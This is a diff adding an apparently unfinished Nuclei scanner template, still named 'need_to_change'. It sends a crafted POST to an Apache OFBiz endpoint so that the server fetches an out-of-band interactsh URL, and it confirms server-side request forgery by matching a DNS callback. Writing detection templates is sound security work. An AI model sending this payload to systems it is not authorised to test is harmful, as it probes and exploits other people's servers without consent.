@@ -1,0 +1,28 @@
+id: need_to_change
+
+info:
+  name: need_to_change
+  author: msk
+  severity: high
+
+
+
+
+http:
+  - raw:
+      - |
+        POST /partymgr/control/getJSONuiLabelArray HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        requiredLabels={"https://{{interactsh-url}}/api":["{{randstr}}"]}
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
